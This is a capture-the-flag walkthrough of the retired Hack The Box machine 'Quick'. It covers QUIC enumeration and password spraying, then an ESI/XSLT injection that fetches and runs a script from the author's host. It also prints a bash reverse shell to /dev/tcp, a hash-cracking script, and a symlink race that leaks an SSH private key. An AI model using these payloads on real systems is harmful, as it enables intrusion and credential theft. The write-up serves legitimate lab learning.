# Quick

This is the write-up for the box Quick that got retired at the 29th August 2020.
My IP address was 10.10.14.9 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.186    quick.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/quick.nmap 10.10.10.186
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Quick | Broadband Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP port scan:
```
nmap -sU 10.10.10.186
```
```
PORT    STATE         SERVICE
443/udp open|filtered https
```

## Checking HTTP (Port 9001)

The web page is a custom-developed homepage of a company that sells broadband services.
On the homepage are some links, that show that PHP is used:
- Check our clients --> _/clients.php_
  - Shows names of clients and their country

```
1	QConsulting Pvt Ltd	UK
2	Darkwing Solutions	US
3	Wink	UK
4	LazyCoop Pvt Ltd	China
5	ScoobyDoo	Italy
6	PenguinCrop	France
```

- Get Started --> _/login.php_
  - Forwards to a Ticketing System

![Login to Ticketing System](quick_web-1.png)

When trying to log in with random credentials, one of the response headers may be useful later:
```
X-Powered-By: Esigate
```

The software [Esigate](http://www.esigate.org/) is an Open Source project for Web Application integration, Remote Templating and Web Accelerating.

The button _portal_ wants to forward to a **HTTPS** page on _portal.quick.htb_, so that has to be put into the _/etc/hosts_ file.
It is unfortunately not possible to connect to the HTTPS page on the browser and the homepage explains that a client application or a Mobile App has to be used:
```
We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our portal

You might experience some connectivity issues during portal access which we are aware of and working on designing client application to provide better experience for our users. Till then you can avail our services from Mobile App
```

Using the latest HTTP version could mean, that it uses [HTTP/3](https://en.wikipedia.org/wiki/HTTP/3), which uses **QUIC transport protocol** over **UDP**.
The **QUIC protocol** looks like a hint to the name of the box _Quick_ and the **Nmap UDP scan** found a result.

On the homepage are some testimonials of the clients and names could be useful for user enumeration:
```
Tim (Qconsulting Pvt Ltd)
Roy (DarkWng Solutions)
Elisa (Wink Media)
James (LazyCoop Pvt Ltd)
```

Lets search for hidden directories and PHP files with **Gobuster**:
```
gobuster -u http://10.10.10.186:9001 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

It finds the files _search.php_ and _db.php_ which are both blank pages.

Summary of interesting information:
- Ticketing System is found
- Esigate is used
- QUIC / UDP service is used
- Potential usernames

Lets try to get access to the HTTPS service on UDP.

## Checking HTTPS/UDP (UDP Port 443)

To get access to a HTTPS page on UDP, a different client is needed and I will use [Quiche](https://github.com/cloudflare/quiche) that supports QUIC and HTTP/3.

After building it, the **http3-client** can be used to access the web page:
```
./http3-client https://portal.quick.htb
```
```
(...)
Welcome to Quick User Portal</p>

a href="index.php">Home
a href="index.php?view=contact">Contact
a href="index.php?view=about">About
a href="index.php?view=docs">References
```

Now it shows the HTML source code of an _User Portal_ and it is possible to browse through links with this HTTP/3 client:
```
./http3-client https://portal.quick.htb/index.php?view=contact > contact.html

firefox contact.html
```

![Contact form](quick_web-2.png)

This contact form may have vulnerabilities that can be exploited.

```
./http3-client https://portal.quick.htb/index.php?view=about > about.html

firefox about.html
```

![About Page](quick_web-3.png)

Potential usernames:
- jane[@]quick.htb
- mike[@]quick.htb
- john[@]quick.htb

```
./http3-client https://portal.quick.htb/index.php?view=docs
```
```
a href="docs/QuickStart.pdf">Quick-Start Guide
a href="docs/Connectivity.pdf">Connectivity Guide
```

There are two PDF files that can be downloaded:
```
./http3-client https://portal.quick.htb/docs/QuickStart.pdf > QuickStart.pdf

./http3-client https://portal.quick.htb/docs/Connectivity.pdf > Connectivity.pdf
```

The PDF _Connectivity.pdf_ contains information how to connect to their services and reveals a password and an IP:

![Connectivity.pdf](quick_pdf-1.png)

```
How to Connect ?

1. Once router is up and running just navigate to http://172.15.0.4/quick_login.jsp
2. You can use your registered email address and Quick4cc3$$ as password.
3. Login and change your password for WiFi and ticketing system.
4. Don’t forget to ping us on chat whenever there is an issue.
```

We browsed through all sites and got all information there is, so the password may work on the login page on port 9001.

## Enumerating Ticketing System (Port 9001)

By creating a list of users, the password from the PDF can be tested against all of the usernames that were found so far:
```
tim@qconsulting.com
tim@qconsulting.co.uk
roy@darkwing.com
roy@darkwing.us
elisa@wink.com
elisa@wink.co.uk
james@lazycoop.com
james@lazycoop.cn
jane@quick.htb
mike@quick.htb
john@quick.htb
```

Using **wfuzz** on the Ticking Portal:
```
wfuzz -u http://10.10.10.186:9001/login.php -w quick_emails.txt -d 'email=FUZZ&password=Quick4cc3$$'
```

Only the response code for the user _elisa[@]wink.co.uk_ is _302 Found_ and when trying to log in, it works and access to the Ticketing System with this user is gained.

There is the functionality to search for tickets and raise a ticket:

![Raise ticket](quick_web-4.png)

> NOTE: The ticket searching only works correctly on the hostname quick.htb and not with the IP

After raising some tickets, it will generate a ticket number:
```
Ticket NO : "TKT-1697" raised. We will answer you as soon as possible
```

After trying different web vulnerabilities and enumerating the application, there is only one thing that was not checked yet and that is **Esigate**, which was found earlier.

When searching for **Esigate vulnerabilities**, there is an [article of GoSecure](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) that describes an **ESI (Edge Side Includes) Injection** that can lead to Remote Code Execution through a kind of **XML External Entity Injection**.

### Exploiting Esigate

Raising a ticket with the payload:
```
Title: test
Message: <esi:include src="http://10.10.14.9/test.xml" stylesheet="http://10.10.14.9/esi.xsl"> </esi:include>
```

After searching for the generated ticket number, the listener on my IP and port 80 will get an HTTP response from the site:
```
GET /esi.xsl HTTP/1.1
(...)
Referer: http://localhost:80/home.php
(...)
X-Forwarded-For: 10.10.14.9
X-Forwarded-Proto: http
X-Esigate-Int-Surrogate-Id: esigate
Surrogate-Capabilities: esigate="Surrogate/1.0 ESI/1.0 ESI-Inline/1.0 X-ESI-Fragment/1.0 X-ESI-Replace/1.0 X-ESI-XSLT/1.0 ESIGATE/4.0"
(...)
Host: 10.10.14.9
```

Now the _esi.xsl_ payload has to be hosted on our local client and I will change the command to use `curl` to test if command execution works:
```
touch test.xml
```
```
(...)
<root>
<xsl:variable name="cmd"><![CDATA[curl http://10.10.14.9/success]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
(...)
```

Starting a PHP web server and searching for the generated ticket number:
```
php -S 0.0.0.0:80

PHP 7.4.21 Development Server (http://0.0.0.0:80) started

10.10.10.186:54082 [200]: (null) http://10.10.14.9/esi.xsl
10.10.10.186:54084 [200]: (null) http://10.10.14.9/test.xml
10.10.10.186:54086 [404]: (null) /success - No such file or directory
```

There was a successful response and thus code execution works.
Lets modify _esi.xsl_ to download a reverse shell bash script and the execute it.

Creating the bash script:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.9/9001 0>&1
```

Uploading the script to the box:
```
<xsl:variable name="cmd"><![CDATA[curl 10.10.14.9/shell -o /tmp/shell]]></xsl:variable>
```

Searching for the ticket number to upload it and then modifying the _esi.xsl_ payload again to execute the script:
```
<xsl:variable name="cmd"><![CDATA[bash /tmp/shell]]></xsl:variable>
```

After searching again for the ticket number, the bash script will be executed and the listener on my IP and port 9001 starts a reverse shell as the user _sam_.

## Privilege Escalation

When searching the box for useful information, there is another web service installed on _/var/www/printer/_.
The Apache configuration file _/etc/apache2/sites-available/000-default.conf_ shows where this site is used:
```
(...)
<VirtualHost *:80>
        AssignUserId srvadm srvadm
        ServerName printerv2.quick.htb
        DocumentRoot /var/www/printer
</VirtualHost>
```

The hostname _printerv2.quick.htb_ has to be put into our _/etc/hosts_ file to reach it and the website is hosted on port 9001 and shows some login form:

![Printer Login form](quick_web-5.png)

We have access to the web files and the file _index.php_ shows a username that can access this page:
```
if($num_rows > 0 && $email === "srvadm@quick.htb")
```

The file _db.php_ has credentials to access the MySQL database:
```
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
```

Connecting to the MySQL database:
```
mysql -u db_adm -p
```

Searching through the database to get user information:
```
mysql> show databases;

mysql> use quick;

mysql> show tables;

mysql> select * from users;
```
```
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
```

The hashes cannot be found in public databases, but _index.php_ shows how they got encrypted:
```
(...)
$password = $_POST["password"];
$password = md5(crypt($password,'fa'));
(...)
```

Creating a PHP script to decrypt it:
```php

$hash = 'e626d51f8fbfd1124fdea88396c35d05';
$wordlist = explode("\n",file_get_contents('/usr/share/wordlists/rockyou.txt'));

foreach($wordlist as $word) {
        $attempt = md5(crypt($word,"fa"));
        if ($hash === $attempt) {
                echo("Cracked: " . $word . "\n");
                exit(0);
        }
}

echo("Not Cracked\n");
exit(1);
```
```
php crack_md5.php

Cracked: yl51pbx
```

The hash gets cracked and the login to the printer web page works with the user _srvadm@quick.htb_.

### Exploiting Printer Page

The homepage says that it is _An application for printing POS receipts_ and it is possible to add printers:

![Adding printer](quick_web-6.png)

After adding a printer with my IP address, a print job can be sent to it on port 9100.

![Sending job to printer](quick_web-7.png)

The listener on my IP and port 9100 received a connection and the specified text:
```
nc -lvnkp 9100

Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:53970.
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:54006.

This is a testVA
```

The file _job.php_ contains the code for how this function works and there is a vulnerability:
```php
// (...)
file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
chmod("/var/www/printer/jobs/".$file,"0777");
// (...)
$printer = new Printer($connector);
$printer -> text(file_get_contents("/var/www/jobs/".$file));
// (...)
```

It creates a file in _/var/www/jobs_ and sets the the permissions to 777 and for printing it reads from this file.
By creating a symlink on the file in the right moment, we should be able to specify another file to print the contents of the specified file.
This file could be an SSH key for example.

Finding out the name of the file:
```
sam@quick:/var/www/jobs$ for i in $(seq 0 100); do sleep .2; ls; done
```

After printing again, the loop will catch the file name and it is the current date and time:
```
2021-09-14_17:30:56
```

I will create a script that will create a symlink that reads the SSH key of _srvadm_ upon file creation:
```bash
for i in $(seq 0 90000); do
        x=$(ls /var/www/jobs)
        if [[ $x ]]; then
                rm -f /var/www/jobs/$x
                ls -la /var/www/jobs
                ln -s /home/srvadm/.ssh/id_rsa /var/www/jobs/$x
                ls -la /var/www/jobs
        fi
done
```

This can be executed on the box and when sending a new print job, the `netcat` listener on port 9100 will print out the SSH key in _/home/srvadm/.ssh/id_rsa_:
```
Ncat: Connection from 10.10.10.186:55568.
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
(...)
```

It can be used to gain access to the box as _srvadm_ via SSH:
```
chmod 600 srvadm_id_rsa

ssh -i srvadm_id_rsa srvadm@10.10.10.186
```

### Privilege Escalation to root

In the home directory of _srvadm_ is a _.cache_ folder with different configuration files for printers.
The file _.cache/conf.d/printers.conf_ contains a password for another printer service:
```
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
```

URL-decoded password:
```
&ftQ4K3SGde8?
```

When switching users to root with `su -` with this password, it gets accepted and we become root!
